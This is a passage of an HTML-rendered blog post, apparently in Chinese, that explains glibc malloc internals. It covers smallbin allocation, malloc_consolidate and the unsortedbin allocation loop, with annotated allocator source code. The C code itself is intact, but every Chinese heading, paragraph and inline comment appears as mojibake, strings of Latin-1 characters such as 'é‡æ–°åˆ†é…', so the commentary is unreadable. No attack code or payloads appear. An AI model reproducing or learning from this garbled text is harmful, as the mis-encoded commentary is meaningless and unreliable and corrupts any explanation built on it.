errout:</span><br><span class="line">            malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        check_remalloced_chunk (av, victim, nb);<span class="comment">//é‡æ–°åˆ†é…çš„å †å—æ£€æŸ¥,è¿™é‡ŒæŒ‡çš„æ˜¯ä»topchunkå‰²ä¸‹æ¥ç„¶åfreeè¿›å…¥å„ç§binsç„¶ååˆè¢«é‡æ–°åˆ©ç”¨çš„å †å—</span></span><br><span class="line">        <span class="type">void</span> *p = chunk2mem (victim);<span class="comment">//</span></span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h4 id="smallbinsåŒºåˆ†é…"><a href="#smallbinsåŒºåˆ†é…" class="headerlink" title="smallbinsåŒºåˆ†é…"></a>smallbinsåŒºåˆ†é…</h4><p>binsæ•°ç»„ä¸­ç»´æŠ¤çš„æ˜¯æ¡¶å­å¤´çš„fd,bkæŒ‡é’ˆ,ä¸€ä¸ªsmallbinå¤´éœ€è¦ä¸¤ä¸ªbinsæ•°ç»„å…ƒç´ å­˜æ”¾,ä¸€ä¸ªè®°å½•fd,ä¸€ä¸ªè®°å½•bk,</p>
<p>çœ‹å›¾ä¸€çœ¼é¡¶é’ˆ</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/smallbin1.png" alt="smallbin1"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">  &#123;</span><br><span class="line">    idx = smallbin_index (nb);<span class="comment">//è®¡ç®—nbæ‰€åœ¨çš„smallbinsä¸‹æ ‡</span></span><br><span class="line">    bin = bin_at (av, idx);<span class="comment">//å–smallbin[idx]æ¡¶å­å¤´èŠ‚ç‚¹</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((victim = last (bin)) != bin)<span class="comment">//last(bin)=bin-&gt;fd,å¦‚æœbinçš„æŒ‡é’ˆè¿˜æ˜¯æŒ‡å‘binè¯´æ˜è¿™ä¸ªæ¡¶å­æ˜¯ç©ºçš„</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">          malloc_consolidate (av);<span class="comment">//å †å—åˆå¹¶</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          &#123;<span class="comment">//ä¸‹é¢è¦å°†victimä»åŒå‘é“¾è¡¨ä¸Šæ‘˜ä¸‹æ¥</span></span><br><span class="line">            bck = victim-&gt;bk;</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<span class="comment">//æ£€æŸ¥victim-&gt;bkæŒ‡å‘çš„å †å—,å…¶fdæŒ‡é’ˆæ˜¯å¦æ˜¯victim</span></span><br><span class="line">              &#123;</span><br><span class="line">                errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">              &#125;</span><br><span class="line">            set_inuse_bit_at_offset (victim, nb);<span class="comment">//ç»è¿‡malloc_consolidateå,å¦‚æœæœ¬å—å’Œç‰©ç†ç›¸é‚»çš„å‰å—éƒ½æ²¡ä½¿ç”¨,åˆ™ä¼šåˆå¹¶èµ·æ¥</span></span><br><span class="line">            <span class="comment">//æŠŠvictimæŠ ä¸‹æ¥,ç„¶åæŠŠæ¡¶å­å¤´å’Œvictim-&gt;bkè¿èµ·æ¥</span></span><br><span class="line">            bin-&gt;bk = bck;</span><br><span class="line">            bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">              victim-&gt;size |= NON_MAIN_ARENA;<span class="comment">//æ ‡è®°éä¸»åˆ†é…åŒº</span></span><br><span class="line">            check_malloced_chunk (av, victim, nb);</span><br><span class="line">            <span class="type">void</span> *p = chunk2mem (victim);<span class="comment">//è·å–dataåŸºåœ°å€æŒ‡é’ˆ</span></span><br><span class="line">            alloc_perturb (p, bytes);<span class="comment">//å¡«å……</span></span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>





<h4 id="fastbinåˆå¹¶"><a href="#fastbinåˆå¹¶" class="headerlink" title="fastbinåˆå¹¶"></a>fastbinåˆå¹¶</h4><p>æ³¨æ„æœ‰ä¸¤ç§åˆ°è¾¾æ­¤å¤„çš„å¯èƒ½,è¦ä¹ˆæ˜¯ä¸€ä¸ª<code>smallbin</code>çš„ç”³è¯·,ä½†æ˜¯æ²¡åœ¨<code>smallbin</code>ä¸­æ‰¾åˆ°å¯¹åº”å †å—,è¦ä¹ˆæ˜¯ä¸€ä¸ªlargebinçš„ç”³è¯·</p>
<p>å‰è€…<strong>ä¸ä¼š</strong>å¼•èµ·<code>fastbin</code>çš„åˆå¹¶,åè€…ä¼šé¦–å…ˆåˆå¹¶<code>fastbin</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line"> &#123;</span><br><span class="line">...</span><br><span class="line">   <span class="keyword">if</span> ((victim = last(bin)) != bin) <span class="comment">// binæ¡¶å­ä¸­çš„æœ€åä¸€ä¸ª,å¦‚æœä¸æ˜¯binè¿™ä¸ªå¤´èŠ‚ç‚¹è‡ªå·±,é‚£ä¹ˆè¯´æ˜è¿™ä¸ªæ¡¶å­é‡Œè‡³å°‘æœ‰ä¸€ä¸ªç©ºé—²å †å—</span></span><br><span class="line">   &#123;</span><br><span class="line">   ...</span><br><span class="line">       <span class="keyword">return</span> p;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line">   idx = largebin_index(nb);</span><br><span class="line">   <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">     malloc_consolidate(av);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p><code>fastbin</code>åˆå¹¶ä¹‹åçš„å †å—,éƒ½ä¼šè¢«æ”¾åˆ°<code>unsortedbin</code>ä¸­,å…¶ç›®çš„æ˜¯ç»™<code>unsortedbin</code>åŒºçš„å°è¯•åˆ†é…å¢å¤§å¯èƒ½æ€§</p>
<p>çœ‹ä¸Šå»æ­¤æ—¶å°†<code>fastbin</code>è¿›è¡Œåˆå¹¶,æœ‰æŸæ•ˆç‡,ä½†è¿™æ˜¯ä¸ºäº†é˜²æ­¢<code>fastbin</code>æˆªç•™å †å—å¯¼è‡´å †ç©ºé—´ç¢ç‰‡åŒ–(<code>fastbin</code>ä¸­çš„å †å—ä¾ç„¶ä¿æŒä½¿ç”¨çŠ¶æ€,ä¸ä¼šè¢«å…¶ä»–ä¸´è¿‘å †å—å‘å‰æˆ–è€…å‘ååˆå¹¶.å› æ­¤éœ€è¦å¯¹å…¶è¿›è¡Œä¸»åŠ¨åˆå¹¶é‡Šæ”¾)</p>
<p>å¹¶ä¸”ç»éªŒè¡¨æ˜,ä¸€ä¸ªç¨‹åºè¦ä¹ˆä¸»è¦ä½¿ç”¨<code>smallbin</code>å¤§å°çš„å †å—,è¦ä¹ˆä¸»è¦ä½¿ç”¨<code>largebin</code>å¤§å°çš„å †å—</p>
<p>å› æ­¤å¯¹<code>fastbin</code>çš„åˆå¹¶æ“ä½œä¸ä¼šè¢«ç»å¸¸è°ƒç”¨</p>
<p>å…·ä½“çš„<code>fastbin</code>åˆå¹¶è¿‡ç¨‹,åœ¨<code>malloc_consolidate</code>ä¸­</p>
<h5 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h5><blockquote>
<p>ç”¨äº<code>fastbin</code>åŒºçš„åˆå¹¶</p>
<p>ä¸¤å±‚å¾ªç¯,å¤–å±‚å¾ªç¯éå†<code>fastbin</code>æ¡¶å­å¤´</p>
<p>å†…å±‚å¾ªç¯éå†æŒ‚è½½ä¸€ä¸ªæ¡¶å­å¤´ä¸Šçš„å †å—é“¾è¡¨</p>
<p>å¯¹æ¯ä¸ªå †å—,å°è¯•è¿›è¡Œå‘å‰åˆå¹¶å’Œå‘ååˆå¹¶,æ³¨æ„åªä¼šåˆ†åˆ«æ‰§è¡Œä¸€æ¬¡</p>
<p>å¦‚æœå°è¯•å‘ååˆå¹¶æ—¶å‘ç°å’Œ<code>topchunk</code>ç›¸é‚»åˆ™å¹¶å…¥<code>topchunk</code></p>
<p>å¦‚æœå°è¯•å‘å‰åˆå¹¶å’Œå‘ååˆå¹¶ä¹‹å,æ²¡æœ‰å¹¶å…¥topchunkä¼šè¢«å¤´æ’æ³•é“¾æ¥åˆ°<code>unsortedbin</code>çš„åŒå‘é“¾è¡¨ä¸Š </p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">malloc_consolidate</span><span class="params">(mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">  mfastbinptr *fb;          <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr *maxfb;       <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr p;              <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr nextp;          <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr unsorted_bin;   <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr first_unsorted; <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="type">int</span> nextinuse;</span><br><span class="line">  mchunkptr bck;</span><br><span class="line">  mchunkptr fwd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If max_fast is 0, we know that av hasn&#x27;t</span></span><br><span class="line"><span class="comment">    yet been initialized, in which case do so below</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (get_max_fast() != <span class="number">0</span>)<span class="comment">//å¦‚æœmax_faxtå€¼ä¸ºç©º,åˆ™è¯´æ˜å †è¿˜æ²¡æœ‰åˆå§‹åŒ–</span></span><br><span class="line">  &#123;</span><br><span class="line">    clear_fastchunks(av);</span><br><span class="line"></span><br><span class="line">    unsorted_bin = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">      then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">      placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">      until malloc is sure that chunks aren&#x27;t immediately going to be</span></span><br><span class="line"><span class="comment">      reused anyway.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    maxfb = &amp;fastbin(av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">    fb = &amp;fastbin(av, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      p = atomic_exchange_acq(fb, <span class="number">0</span>); <span class="comment">// p=fb,fb++</span></span><br><span class="line">      <span class="keyword">if</span> (p != <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123; <span class="comment">// é‡Šæ”¾å¿«æ¡¶å­pä¸ŠæŒ‚ç€çš„æ‰€æœ‰å †å—</span></span><br><span class="line">          check_inuse_chunk(av, p);</span><br><span class="line">          nextp = p-&gt;fd; <span class="comment">// å…ˆå–åç»§</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">          size = p-&gt;size &amp; ~(PREV_INUSE | NON_MAIN_ARENA); <span class="comment">// æ’¤é”€flag</span></span><br><span class="line">          nextchunk = chunk_at_offset(p, size);            <span class="comment">// ç‰©ç†ä¸Šç›¸é‚»çš„ä¸‹ä¸€ä¸ªå †å—</span></span><br><span class="line">          nextsize = chunksize(nextchunk);   </span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (!prev_inuse(p))<span class="comment">//å‘å‰åˆå¹¶</span></span><br><span class="line">          &#123;</span><br><span class="line">            prevsize = p-&gt;prev_size;</span><br><span class="line">            size += prevsize;</span><br><span class="line">            p = chunk_at_offset(p, -((<span class="type">long</span>)prevsize));<span class="comment">//å–ç‰©ç†ä¸Šå‰ä¸€ä¸ªç›¸é‚»çš„å †å—åŸºå€,ä½œä¸ºåˆå¹¶å †å—çš„åŸºå€</span></span><br><span class="line">            unlink(av, p, bck, fwd);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (nextchunk != av-&gt;top)<span class="comment">//å¦‚æœåé¢å’Œtopchunkç›¸é‚»åˆ™å’Œtopchunkåˆå¹¶,å¦åˆ™å°è¯•å‘ååˆå¹¶</span></span><br><span class="line">          &#123;</span><br><span class="line">            nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!nextinuse)</span><br><span class="line">            &#123;</span><br><span class="line">              size += nextsize;</span><br><span class="line">              unlink(av, nextchunk, bck, fwd);<span class="comment">//å¦‚æœç‰©ç†ä¸Šåé¢ç›¸é‚»çš„å †å—æ²¡åœ¨ä½¿ç”¨åˆ™å‘ååˆå¹¶</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            first_unsorted = unsorted_bin-&gt;fd;<span class="comment">//å–ç¬¬ä¸€ä¸ªunsorted_binä¸Šæ‚¬æŒ‚çš„å †å—</span></span><br><span class="line">            unsorted_bin-&gt;fd = p;<span class="comment">//å¤´æ’æ³•</span></span><br><span class="line">            first_unsorted-&gt;bk = p;<span class="comment">//å°†pé“¾æ¥åˆ°unsorted_binå’Œpä¹‹é—´</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!in_smallbin_range(size))<span class="comment">//å¦‚æœè¿™ä¸ªåˆå¹¶å †å—åœ¨largebinèŒƒå›´å†…åˆ™åˆå§‹åŒ–å…¶nextsizeæŒ‡é’ˆ</span></span><br><span class="line">            &#123;</span><br><span class="line">              p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">              p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            set_head(p, size | PREV_INUSE);</span><br><span class="line">            p-&gt;bk = unsorted_bin;</span><br><span class="line">            p-&gt;fd = first_unsorted;</span><br><span class="line">            set_foot(p, size);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            size += nextsize;</span><br><span class="line">            set_head(p, size | PREV_INUSE);<span class="comment">//påé¢å°±æ˜¯topchunk,påˆå¹¶åˆ°topchunk</span></span><br><span class="line">            av-&gt;top = p;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">while</span> ((p = nextp) != <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (fb++ != maxfb);<span class="comment">//éå†æ•´ä¸ªfastbin,ç›´åˆ°fastbinæ¡¶å­å¤´å“¨å…µmaxfb</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    malloc_init_state(av);<span class="comment">//åˆå§‹åŒ–å †</span></span><br><span class="line">    check_malloc_state(av);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>











<h4 id="unsortedbinåŒºåˆ†é…"><a href="#unsortedbinåŒºåˆ†é…" class="headerlink" title="unsortedbinåŒºåˆ†é…"></a>unsortedbinåŒºåˆ†é…</h4><h5 id="unsortedbinå°è¯•åˆ†é…-ä¸-å½’ç±»"><a href="#unsortedbinå°è¯•åˆ†é…-ä¸-å½’ç±»" class="headerlink" title="unsortedbinå°è¯•åˆ†é… ä¸ å½’ç±»"></a>unsortedbinå°è¯•åˆ†é… ä¸ å½’ç±»</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av))<span class="comment">//æ£€æŸ¥unsortedbinä¸­æ˜¯å¦ç¡®å®æœ‰å †å—,æœ‰åˆ™ä»unsortedbinä¸­æ‹¿ä¸‹ç¬¬ä¸€ä¸ªå †å—</span></span><br><span class="line">    &#123;</span><br><span class="line">      bck = victim-&gt;bk;<span class="comment">//åç»§</span></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect(victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) || __builtin_expect(victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">        malloc_printerr(check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                        chunk2mem(victim), av);</span><br><span class="line">      size = chunksize(victim);<span class="comment">//æ ¹æ®sizeå­—æ®µè·å–victimçš„å¤§å°</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">         only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">         runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">         exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">         no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range(nb) &amp;&amp;<span class="comment">//å¦‚æœæ˜¯ä¸€ä¸ªsmallbinçš„åˆ†é…ç”³è¯·</span></span><br><span class="line">          bck == unsorted_chunks(av) &amp;&amp;<span class="comment">//bck=victim-&gt;bkå¦‚æœè¿™ä¸ªåˆ¤æ–­é€šè¿‡,è¯´æ˜åˆšä»unsortedbinä¸­æ‹†ä¸‹çš„å †å—victimæ˜¯unsoretedä¸­å”¯ä¸€çš„å †å—</span></span><br><span class="line">          victim == av-&gt;last_remainder &amp;&amp;<span class="comment">//å¦‚æœvictimæ˜¯æœ€è¿‘ä¸€æ¬¡åˆ†é…è¿‡çš„å †å—,æœ€è¿‘ä½¿ç”¨çš„å †å—é¡µé¢å¯èƒ½è¿˜åœ¨å†…å­˜ä¸­,å› æ­¤æœ‰è¿™ç§ä¼˜åŒ–</span></span><br><span class="line">          (<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>)(nb + MINSIZE))<span class="comment">//å¦‚æœè¿™ä¸ªvictimå †å—æ»¡è¶³å¤§å°è¦æ±‚</span></span><br><span class="line">      &#123;<span class="comment">//è¿™ä¸ªvictimé€šè¿‡äº†è€ƒå¯Ÿ,ä¸‹é¢å°†å…¶åˆ†å‰²,å°†æ»¡è¶³å¤§å°è¦æ±‚çš„éƒ¨åˆ†ç»™ç”¨æˆ·,å‰©ä¸‹çš„éƒ¨åˆ†å†æ”¾å›unsortedbin</span></span><br><span class="line">        <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">        remainder_size = size - nb;<span class="comment">//å‰©ä½™å¤§å°</span></span><br><span class="line">        remainder = chunk_at_offset(victim, nb);<span class="comment">//victimçš„å‰åŠéƒ¨åˆ†å°†è¦åˆ†å‡ºå»ç»™ç”¨æˆ·,åé¢çš„å‰©ä¸‹,remainderæ˜¯å‰©ä¸‹éƒ¨åˆ†çš„åŸºåœ°å€</span></span><br><span class="line">        unsorted_chunks(av)-&gt;bk = unsorted_chunks(av)-&gt;fd = remainder;<span class="comment">//æ›´æ–°unsortedbinä¸­è¿™ä¸ªå”¯ä¸€å †å—çš„å‰©ä½™çŠ¶æ€</span></span><br><span class="line">        av-&gt;last_remainder = remainder;<span class="comment">//å‰©ä½™å †å—è®°ä¸ºæœ€è¿‘ä½¿ç”¨</span></span><br><span class="line">        remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks(av);<span class="comment">//è®¾ç½®å‰åæŒ‡é’ˆéƒ½ä¸ºunsortedbinæ¡¶å­</span></span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range(remainder_size))<span class="comment">//å¦‚æœå‰©ä¸‹çš„éƒ¨åˆ†å±äºlargebinèŒƒå›´,åˆ™åˆå§‹åŒ–ä¸¤ä¸ªæŒ‡é’ˆ</span></span><br><span class="line">        &#123;</span><br><span class="line">          remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">          remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        set_head(victim, nb | PREV_INUSE |</span><br><span class="line">                             (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        set_head(remainder, remainder_size | PREV_INUSE);<span class="comment">//å› ä¸ºå‰å—è¢«åˆ†é…,å› æ­¤remainderçš„prev_inuseç½®1</span></span><br><span class="line">        set_foot(remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">        check_malloced_chunk(av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem(victim);<span class="comment">//p=victim+0x10æŒ‡å‘dataåŒºåŸŸ</span></span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">      unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = unsorted_chunks(av);<span class="comment">//å°†binä»unsortedbinä¸­æ‹¿å‡ºæ¥,ç„¶åå°†å…¶å‰åé©±è¿æ¥</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (size == nb)<span class="comment">//å¦‚æœå°è¯•åˆ†é…çš„å¤§å°,æ°å¥½å’Œè¿™ä¸ªunsortedbinå †å—ä¸€æ ·å¤§åˆ™åˆ†é…ä¹‹</span></span><br><span class="line">      &#123;</span><br><span class="line">        set_inuse_bit_at_offset(victim, size);</span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">          victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">        check_malloced_chunk(av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span 